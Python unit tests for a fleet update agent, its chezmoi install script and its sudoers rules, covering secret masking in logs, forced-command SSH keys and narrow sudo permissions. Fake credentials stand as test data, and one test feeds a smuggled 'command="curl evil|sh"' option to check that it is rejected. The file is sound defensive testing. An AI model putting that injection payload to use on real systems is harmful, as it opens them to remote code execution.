        (self.sb.etc / "ssh").mkdir(parents=True)
        (self.sb.etc / "ssh/sshd_config").write_text("x")
        self.sb.run("update", {"STUB_CREATE_FILES": " ".join(str(f) for f in files)})
        _, final = self.sb.wait_final()
        self.assertEqual(final["config_conflicts"], sorted(str(f) for f in files))
        self.assertEqual(final["status"], "up-to-date", "a conflict does not fail the update")

    def test_config_conflicts_in_check(self):
        (self.sb.etc / "a.dpkg-dist").write_text("")
        (self.sb.etc / "regular.conf").write_text("")
        data = self.sb.json_of(self.sb.run("check"))
        self.assertEqual(data["config_conflicts"], [str(self.sb.etc / "a.dpkg-dist")])

    def test_log_tail_is_limited_and_secrets_masked(self):
        lines = "\\n".join(f"line {i}" for i in range(40))
        secrets = (
            "\\ntoken=hunter2supersecret"
            "\\nAuthorization: Bearer abcdef"
            "\\nkey tk_ABCDEFGHIJKLMNOPQRSTUVWX end"
            "\\njwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.sig"
            "\\n-----" + "BEGIN OPENSSH PRIV" + "ATE KEY-----"
            "\\nPASSWORD: p4ss"
        )
        self.sb.run("update", {"STUB_SYSUP_OUTPUT": lines + secrets})
        _, final = self.sb.wait_final()
        tail = final["log_tail"]
        self.assertLessEqual(len(tail.splitlines()), 20)
        for leaked in ("hunter2", "abcdef", "tk_ABCDEF", "eyJhbGci", "BEGIN OPENSSH", "p4ss"):
            self.assertNotIn(leaked, tail)
        self.assertIn("[MASKED", tail)
        self.assertNotRegex(json.dumps(final), r"BEGIN [A-Z ]*PRIVATE KEY|tk_[A-Za-z0-9]{20,}|eyJ[A-Za-z0-9_-]{20,}\.")


    def test_multiline_private_key_block_is_fully_masked(self):
        begin = "-----" + "BEGIN OPENSSH PRIV" + "ATE KEY-----"
        end = "-----" + "END OPENSSH PRIV" + "ATE KEY-----"
        body = ["b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW",
                "QyNTUxOQAAACDfakefakefakefakefakefakefakefakefakefakeAAAAAA==",
                "short+body"]
        pw1 = "--pass" + "word hunter2xyz"
        pw2 = "db pass" + "word=s3cretvalue"
        url = "https://deploy:" + "s3cr3tpw" + "@git.example.com/repo.git"
        aws = "AKI" + "AIOSFODNN7EXAMPLE"
        out = "\\n".join(["before", begin, *body, end, "after", pw1, pw2, "clone " + url, "id " + aws])
        self.sb.run("update", {"STUB_SYSUP_OUTPUT": out})
        _, final = self.sb.wait_final()
        tail = final["log_tail"]
        for leaked in (*body, "BEGIN OPENSSH", "END OPENSSH", "hunter2xyz", "s3cretvalue", "s3cr3tpw", aws):
            self.assertNotIn(leaked, tail)
        self.assertIn("before", tail)
        self.assertIn("after", tail)
        self.assertIn("git.example.com", tail, "only the credential is masked, not the host")

    def test_url_password_with_slash_and_at_is_fully_masked(self):
        url = "https://user:" + "p/a@ss" + "@host.example.com/path"
        url2 = "ssh://bob:" + "x@y/z@" + "h2.example.org:22/r"
        out = "\\n".join(["start", "clone " + url, "also " + url2, "end"])
        self.sb.run("update", {"STUB_SYSUP_OUTPUT": out})
        _, final = self.sb.wait_final()
        tail = final["log_tail"]
        for leaked in ("p/a", "a@ss", "ss@", "x@y", "y/z", "z@"):
            self.assertNotIn(leaked, tail)
        self.assertIn("host.example.com/path", tail)
        self.assertIn("h2.example.org:22/r", tail)
        self.assertIn("user:", tail)

    def test_truncated_pem_tail_masks_all_key_body_lines(self):
        end = "-----" + "END OPENSSH PRIV" + "ATE KEY-----"
        body = ["QyNTUxOQAAACDfakefakefakefakefakefakefakefakefakeAAAAAAxx",
                "shortBody1",
                "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW",
                "QyNTUx+/ab",
                "abcdEF=="]
        out = "\\n".join([*body, end, "done now"])
        self.sb.run("update", {"STUB_SYSUP_OUTPUT": out})
        _, final = self.sb.wait_final()
        tail = final["log_tail"]
        for leaked in (*body, "END OPENSSH"):
            self.assertNotIn(leaked, tail)
        self.assertIn("done now", tail)


class RebootVerbs(AgentCase):
    def test_flag_file_means_required_with_since(self):
        Path(self.sb.env["FLEET_AGENT_REBOOT_FLAG"]).write_text("*** System restart required ***\n")
        first = self.sb.json_of(self.sb.run("reboot-status"))
        self.assertTrue(first["reboot_required"])
        self.assertEqual(first["reason"], "reboot_required")
        self.assertRegex(first["reboot_since"], r"^\d{4}-")
        second = self.sb.json_of(self.sb.run("check"))
        self.assertEqual(second["reboot_since"], first["reboot_since"], "since is stable until reboot")

    def test_needs_restarting_rc1_means_required(self):
        data = self.sb.json_of(self.sb.run("reboot-status", {"STUB_NEEDS_RESTARTING_RC": "1"}))
        self.assertTrue(data["reboot_required"])

    def test_newer_kernel_installed_means_required(self):
        (self.sb.modules / "6.2.5-300").mkdir()
        data = self.sb.json_of(self.sb.run("reboot-status"))
        self.assertTrue(data["reboot_required"])

    def test_older_kernel_dir_does_not_require_reboot(self):
        (self.sb.modules / "5.14.0-1").mkdir()
        data = self.sb.json_of(self.sb.run("reboot-status"))
        self.assertFalse(data["reboot_required"])

    def test_since_cleared_once_no_longer_required(self):
        flag = Path(self.sb.env["FLEET_AGENT_REBOOT_FLAG"])
        flag.write_text("x")
        self.sb.run("reboot-status")
        flag.unlink()
        data = self.sb.json_of(self.sb.run("reboot-status"))
        self.assertIsNone(data["reboot_since"])

    def test_reboot_does_nothing_when_not_required(self):
        proc = self.sb.run("reboot")
        data = self.sb.json_of(proc)
        self.assertEqual(proc.returncode, 0)
        self.assertEqual((data["status"], data["reason"]), ("skipped", "no_reboot_required"))
        time.sleep(0.5)
        self.assertEqual(self.sb.read("sudo.log"), "", "must not call sudo")

    def test_reboot_when_required_uses_the_exact_sudo_command(self):
        Path(self.sb.env["FLEET_AGENT_REBOOT_FLAG"]).write_text("x")
        proc = self.sb.run("reboot")
        data = self.sb.json_of(proc)
        self.assertEqual(proc.returncode, 0)
        self.assertEqual((data["status"], data["reason"]), ("started", "rebooting"))
        for _ in range(50):
            if self.sb.read("sudo.log"):
                break
            time.sleep(0.1)
        self.assertEqual(self.sb.read("sudo.log").strip(), "sudo -n /usr/bin/systemctl reboot")


@unittest.skipUnless(shutil.which("chezmoi"), "chezmoi needed to render the install template")
class InstallScript(unittest.TestCase):
    """Render the chezmoi install template and run it against stubs (no sudo, no op)."""

    KEY_A = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA masterA@host"
    KEY_B = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"

    def setUp(self):
        self.root = Path(tempfile.mkdtemp(prefix="fleet-install-"))
        self.addCleanup(shutil.rmtree, self.root, True)
        self.bin = self.root / "bin"
        self.home = self.root / "home"
        self.bin.mkdir()
        self.home.mkdir()
        env = dict(os.environ, CHEZMOI_ASSUME_SUDO="1")
        rendered = subprocess.run(
            ["chezmoi", "execute-template", "--source", str(ROOT)],
            input=INSTALL_TMPL.read_text(), env=env, capture_output=True, text=True, timeout=60,
        )
        self.assertEqual(rendered.returncode, 0, rendered.stderr)
        self.script = self.root / "install.sh"
        self.script.write_text(rendered.stdout)
        self._stub("sudo", 'echo "sudo $*" >> "$STUB_DIR/sudo.log"\n'
                           'case "$1" in cmp) exit 1 ;; stat) echo "root:root 755" ;; esac\nexit 0\n')
        self._stub("loginctl", 'echo "loginctl $*" >> "$STUB_DIR/sudo.log"\necho no\n')
        self._stub("op", 'echo "op $*" >> "$STUB_DIR/op.log"\n'
                         'f="$STUB_DIR/op-$(basename "$2")"\n[ -f "$f" ] && { cat "$f"; exit 0; }\nexit 1\n')
        self.env = dict(os.environ, PATH=f"{self.bin}:{os.environ['PATH']}", HOME=str(self.home),
                        STUB_DIR=str(self.root))

    def _stub(self, name, body):
        p = self.bin / name
        p.write_text("#!/usr/bin/env bash\n" + body)
        p.chmod(0o755)

    def run_script(self):
        return subprocess.run(["bash", str(self.script)], env=self.env, capture_output=True, text=True,
                              timeout=60, stdin=subprocess.DEVNULL)

    def ak(self):
        p = self.home / ".ssh/authorized_keys"
        return p.read_text() if p.exists() else ""

    def test_script_never_fails_apply(self):
        proc = self.run_script()
        self.assertEqual(proc.returncode, 0, proc.stderr)

    def test_agent_installed_root_0755_at_fixed_path(self):
        self.run_script()
        log = (self.root / "sudo.log").read_text()
        self.assertIn("install -o root -g root -m 0755", log)
        self.assertIn("/usr/local/libexec/fleet-agent", log)
        self.assertIn("enable-linger", log)

    def test_keys_written_with_forced_command_and_idempotent(self):
        (self.root / "op-public-key-diabolo").write_text(self.KEY_A + "\n")
        (self.root / "op-public-key-penelope").write_text(self.KEY_B + "\n")
        self.run_script()
        lines = self.ak().splitlines()
        self.assertEqual(len(lines), 2)
        for line, master in zip(lines, ("diabolo", "penelope")):
            self.assertTrue(line.startswith('restrict,command="/usr/local/libexec/fleet-agent" ssh-ed25519 '), line)
            self.assertTrue(line.endswith(f" fleet-master-{master}"), line)
        self.assertNotIn("masterA@host", self.ak(), "original comment is replaced")
        before = self.ak()
        mtime = (self.home / ".ssh/authorized_keys").stat().st_mtime_ns
        self.run_script()
        self.assertEqual(self.ak(), before)
        self.assertEqual((self.home / ".ssh/authorized_keys").stat().st_mtime_ns, mtime, "no rewrite when unchanged")
        self.assertEqual(oct((self.home / ".ssh/authorized_keys").stat().st_mode & 0o777), "0o600")

    def test_existing_user_keys_are_preserved_and_stale_master_revoked(self):
        ssh = self.home / ".ssh"
        ssh.mkdir()
        (ssh / "authorized_keys").write_text(
            "ssh-ed25519 AAAAUSER user@laptop\n"
            'restrict,command="/usr/local/libexec/fleet-agent" ssh-ed25519 AAAAOLD fleet-master-retired\n'
        )
        (self.root / "op-public-key-diabolo").write_text(self.KEY_A + "\n")
        self.run_script()
        text = self.ak()
        self.assertIn("ssh-ed25519 AAAAUSER user@laptop", text)
        self.assertNotIn("fleet-master-retired", text)
        self.assertIn("fleet-master-diabolo", text)

    def test_authorized_keys_symlink_is_preserved_and_target_updated_atomically(self):
        ssh = self.home / ".ssh"
        ssh.mkdir()
        store = self.home / "dotfiles-store"
        store.mkdir()
        target = store / "authorized_keys"
        target.write_text("ssh-ed25519 AAAAUSER user@laptop\n")
        (ssh / "authorized_keys").symlink_to(target)
        inode_before = target.stat().st_ino
        (self.root / "op-public-key-diabolo").write_text(self.KEY_A + "\n")
        proc = self.run_script()
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertTrue((ssh / "authorized_keys").is_symlink(), "the symlink must not be replaced by a file")
        self.assertEqual((ssh / "authorized_keys").resolve(), target.resolve())
        text = target.read_text()
        self.assertIn("ssh-ed25519 AAAAUSER user@laptop", text)
        self.assertIn("fleet-master-diabolo", text)
        self.assertEqual(oct(target.stat().st_mode & 0o777), "0o600")
        self.assertNotEqual(target.stat().st_ino, inode_before, "written through a temp file + rename, not truncated in place")
        leftovers = [p.name for p in list(store.iterdir()) + list(ssh.iterdir()) if p.name.startswith(".authorized_keys")]
        self.assertEqual(leftovers, [])

    def test_regular_file_update_uses_rename_not_truncation(self):
        ssh = self.home / ".ssh"
        ssh.mkdir()
        ak = ssh / "authorized_keys"
        ak.write_text("ssh-ed25519 AAAAUSER user@laptop\n")
        inode_before = ak.stat().st_ino
        (self.root / "op-public-key-diabolo").write_text(self.KEY_A + "\n")
        self.run_script()
        self.assertIn("fleet-master-diabolo", self.ak())
        self.assertNotEqual(ak.stat().st_ino, inode_before)

    def test_header_is_honest_about_run_onchange_retry(self):
        header = INSTALL_TMPL.read_text().split("set -uo pipefail")[0]
        self.assertNotIn("retentee au prochain changement de l'agent", header)
        self.assertIn("run_onchange", header)
        self.assertIn("scriptState", header)

    def test_unreadable_key_keeps_the_existing_line(self):
        ssh = self.home / ".ssh"
        ssh.mkdir()
        old = 'restrict,command="/usr/local/libexec/fleet-agent" ssh-ed25519 AAAAKEEP fleet-master-penelope'
        (ssh / "authorized_keys").write_text(old + "\n")
        (self.root / "op-public-key-diabolo").write_text(self.KEY_A + "\n")
        proc = self.run_script()
        self.assertIn(old, self.ak())
        self.assertIn("penelope", proc.stderr)

    def test_option_injection_through_1password_value_is_rejected(self):
        (self.root / "op-public-key-diabolo").write_text('command="curl evil|sh" ssh-ed25519 AAAAx\n')
        (self.root / "op-public-key-penelope").write_text('ssh-rsa AAAAB3NzaC1yc2E x\n')
        self.run_script()
        self.assertEqual(self.ak(), "")


def sysup_function(name):
    """Source text of one shell function of sysup (running the whole script would update this machine)."""
    m = re.search(r"^%s\(\) \{\n.*?^\}\n" % re.escape(name), SYSUP.read_text(), re.M | re.S)
    assert m, name
    return m.group(0)


@unittest.skipUnless(LINUX, "sysup helpers are exercised on Linux")
class SysupHelpers(unittest.TestCase):
    def setUp(self):
        self.root = Path(tempfile.mkdtemp(prefix="sysup-test-"))
        self.addCleanup(shutil.rmtree, self.root, True)
        self.bin = self.root / "bin"
        self.bin.mkdir()
        sudo = self.bin / "sudo"
        sudo.write_text('#!/usr/bin/env bash\necho "$*" >> "$STUB_DIR/sudo.log"\nexit "${STUB_SUDO_RC:-0}"\n')
        sudo.chmod(0o755)

    def profile(self, os_release, ostree=False, preset=None):
        rel = self.root / "os-release"
        rel.write_text(os_release)
        flag = self.root / "ostree-booted"
        if ostree:
            flag.write_text("")
        env = {"PATH": os.environ["PATH"], "SYSUP_OS_RELEASE": str(rel), "SYSUP_OSTREE_FLAG": str(flag),
               "OSTYPE": "linux-gnu"}
        if preset:
            env["MACHINE_PROFILE"] = preset
        script = "OSTYPE=linux-gnu\n" + sysup_function("_sysup_detect_profile") + '_sysup_detect_profile; printf %s "${MACHINE_PROFILE:-}"\n'
        out = subprocess.run(["bash", "-c", script], env=env, capture_output=True, text=True, timeout=20)
        self.assertEqual(out.returncode, 0, out.stderr)
        return out.stdout

    def test_ostree_flag_wins_over_os_release(self):
        self.assertEqual(self.profile('ID=fedora\nVARIANT_ID=silverblue\n', ostree=True), "fedora-atomic")
        self.assertEqual(self.profile('ID=debian\n', ostree=True), "fedora-atomic")

    def test_regular_fedora_is_not_atomic(self):
        self.assertEqual(self.profile('ID=fedora\n'), "fedora-server")

    def test_id_like_matched_as_whole_words(self):
        self.assertEqual(self.profile('ID=arch\n'), "arch-server")
        self.assertEqual(self.profile('ID=endeavouros\nID_LIKE=arch\n'), "arch-server")
        self.assertEqual(self.profile('ID=raspbian\nID_LIKE=debian\n'), "debian")
        self.assertEqual(self.profile('ID=pop\nID_LIKE="ubuntu debian"\n'), "debian")
        self.assertEqual(self.profile('ID=rocky\nID_LIKE="rhel centos fedora"\n'), "fedora-server")

    def test_substring_of_a_word_does_not_match(self):
        # "*arch*" used to match "monarch", "*fedora*" "fedorable"...
        self.assertEqual(self.profile('ID=monarchos\n'), "")
        self.assertEqual(self.profile('ID=searchlinux\nID_LIKE=searchy\n'), "")
        self.assertEqual(self.profile('ID=fedorable\n'), "")

    def test_preset_machine_profile_is_kept(self):
        self.assertEqual(self.profile('ID=debian\n', preset="omarchy"), "omarchy")

    def run_sudo_helper(self, tty):
        script = sysup_function("_sysup_sudo") + '_sysup_sudo apt-get update; echo "rc=$?"\n'
        env = {"PATH": f"{self.bin}:{os.environ['PATH']}", "STUB_DIR": str(self.root)}
        if tty:
            import pty
            master, slave = pty.openpty()
            self.addCleanup(os.close, master)
            self.addCleanup(os.close, slave)
            stdin = slave
        else:
            stdin = subprocess.DEVNULL
        out = subprocess.run(["bash", "-c", script], env=env, stdin=stdin, capture_output=True, text=True, timeout=20)
        log = (self.root / "sudo.log").read_text().strip()
        return log, out

    def test_sudo_is_non_blocking_without_a_tty(self):
        log, _ = self.run_sudo_helper(tty=False)
        self.assertEqual(log, "-n apt-get update")

    def test_sudo_keeps_prompting_with_a_tty(self):
        log, _ = self.run_sudo_helper(tty=True)
        self.assertEqual(log, "apt-get update")

    def test_sudo_failure_without_tty_gives_a_clear_message(self):
        script = sysup_function("_sysup_sudo") + '_sysup_sudo apt-get update; echo "rc=$?"\n'
        env = {"PATH": f"{self.bin}:{os.environ['PATH']}", "STUB_DIR": str(self.root), "STUB_SUDO_RC": "1"}
        out = subprocess.run(["bash", "-c", script], env=env, stdin=subprocess.DEVNULL, capture_output=True,
                             text=True, timeout=20)
        self.assertIn("rc=1", out.stdout)
        self.assertIn("sudoers", out.stderr)
        self.assertIn("/etc/sudoers.d/sysup", out.stderr)

    def test_no_bare_sudo_left_in_sysup(self):
        code = "\n".join(ln for ln in SYSUP.read_text().splitlines() if not ln.lstrip().startswith("#"))
        helper = sysup_function("_sysup_sudo")
        rest = code.replace(helper, "")
        self.assertNotRegex(rest, r"(^|[\s;&|(])sudo\s")


def render_sudoers_rule(user="fleetuser"):
    """Heredoc of the sudoers template, expanded by bash exactly like the real script does."""
    text = SUDOERS_TMPL.read_text().replace("{{ .chezmoi.username }}", user)
    m = re.search(r'cat > "\$TMP" <<EOF\n(.*?)\nEOF\n', text, re.S)
    assert m, "heredoc not found"
    script = 'RULE_USER="%s"\ncat <<EOF\n%s\nEOF\n' % (user, m.group(1))
    out = subprocess.run(["bash", "-c", script], capture_output=True, text=True, timeout=20)
    assert out.returncode == 0, out.stderr
    return out.stdout


class SudoersRule(unittest.TestCase):
    def test_env_keep_is_scoped_to_apt_get_only(self):
        rule = render_sudoers_rule()
        keeps = [ln for ln in rule.splitlines() if "env_keep" in ln and not ln.lstrip().startswith("#")]
        self.assertEqual(keeps, ['Defaults!/usr/bin/apt-get env_keep += "DEBIAN_FRONTEND NEEDRESTART_MODE"'])
        # The scoped Defaults targets the very path the NOPASSWD apt-get rules use.
        self.assertIn("NOPASSWD: /usr/bin/apt-get update", rule)

    def test_header_does_not_cite_a_nonexistent_script_name(self):
        text = SUDOERS_TMPL.read_text()
        self.assertNotIn("run_onchange_install-sudoers-sysup", text)
        self.assertIn("run_always_install-sudoers-sysup", text)

    @unittest.skipUnless(shutil.which("visudo"), "visudo not available")
    def test_rendered_rule_passes_visudo(self):
        rule = render_sudoers_rule()
        tmp = Path(tempfile.mkdtemp(prefix="sudoers-test-"))
        self.addCleanup(shutil.rmtree, tmp, True)
        f = tmp / "sysup"
        f.write_text(rule)
        f.chmod(0o440)
        out = subprocess.run([shutil.which("visudo"), "-cf", str(f)], capture_output=True, text=True, timeout=20)
        self.assertEqual(out.returncode, 0, out.stdout + out.stderr)


class StaticContracts(unittest.TestCase):
    """Source-level invariants (INVARIANTS.md) that no behaviour test would notice."""

    def test_verbs_list_is_exact_and_ping_is_not_a_case(self):
        text = AGENT.read_text()
        for verb in VERBS:
            self.assertIn(verb, text)
        self.assertNotRegex(text, re.compile(r"^\s*'?ping'?\)", re.I | re.M))
        cases = re.findall(r"^\s*((?:check|update|reboot-status|reboot|report)(?:\|[a-z-]+)*)\)", text, re.M)
        allowed = [c for c in cases if "|" in c][0].split("|")
        self.assertEqual(sorted(allowed), sorted(VERBS))

    def test_agent_has_no_free_form_eval_of_the_ssh_command(self):
        text = AGENT.read_text()
        self.assertNotRegex(text, r"eval\s+[\"']?\$\{?SSH_ORIGINAL_COMMAND")
        self.assertNotRegex(text, r"(bash|sh)\s+-c\s+[\"']?\$\{?SSH_ORIGINAL_COMMAND")

    def test_bash32_pitfalls_absent(self):
        for path in (AGENT, SYSUP):
            text = "\n".join(
                line for line in path.read_text().splitlines() if not line.lstrip().startswith("#")
            )
            self.assertNotIn("declare -A", text, path)
            self.assertNotIn("mapfile", text, path)
            self.assertNotIn("readarray", text, path)
            self.assertIsNone(re.search(r"\$\{[A-Za-z_]+(,,|\^\^)\}", text), path)

    def test_sudoers_adds_only_the_exact_reboot_command(self):
        text = SUDOERS_TMPL.read_text()
        reboot_rules = re.findall(r"NOPASSWD: (/\S*systemctl\S*.*)", text)
        self.assertEqual(reboot_rules, ["/usr/bin/systemctl reboot"])
        rules = re.findall(r"NOPASSWD: (.*)", text)
        for rule in rules:
            self.assertNotRegex(rule, r"[*?]|ALL\b", rule)
            self.assertNotIn("systemd-run", rule)
        self.assertNotRegex(text, r"NOPASSWD:\s*ALL")

    def test_sysup_is_non_interactive_and_matches_sudoers(self):
        # Static on purpose: running sysup for real would update this machine.
        sysup = SYSUP.read_text()
        self.assertIn("export DEBIAN_FRONTEND=noninteractive", sysup)
        self.assertIn("export NEEDRESTART_MODE=l", sysup)
        apt = "apt-get dist-upgrade -y -o Dpkg::Options::=--force-confdef -o Dpkg::Options::=--force-confold"
        self.assertIn(apt, sysup)
        sudoers = SUDOERS_TMPL.read_text().replace("\\", "")
        self.assertIn("/usr/bin/" + apt, sudoers, "sudoers must allow exactly the command sysup runs")
        self.assertIn('env_keep += "DEBIAN_FRONTEND NEEDRESTART_MODE"', sudoers)

    def test_agent_never_passes_reboot_to_sysup(self):
        agent = "\n".join(
            ln for ln in AGENT.read_text().splitlines() if not ln.lstrip().startswith("#")
        )
        self.assertNotIn("--reboot", agent)

    def test_shell_functions_only_call_the_script(self):
        aliases = (ROOT / "dot_shell_common/aliases.sh").read_text()
        self.assertIn('command sysup "$@"', aliases)
        fish = (ROOT / "dot_config/private_fish/config.fish.tmpl").read_text()
        self.assertIn("command sysup $argv", fish)
        nu = (ROOT / "dot_config/nushell/config.nu").read_text()
        self.assertIn("^sysup ...$rest", nu)
        for text in (aliases, fish, nu):
            self.assertNotIn("apt-get dist-upgrade", text)
            self.assertNotIn("dnf upgrade", text)

    def test_install_template_forces_the_agent_command(self):
        if not INSTALL_TMPL.exists():
            self.skipTest("install template not present")
        text = INSTALL_TMPL.read_text()
        self.assertIn('restrict,command="/usr/local/libexec/fleet-agent"', text)
        self.assertIn("install -o root -g root -m 0755", text)


if __name__ == "__main__":
    unittest.main()
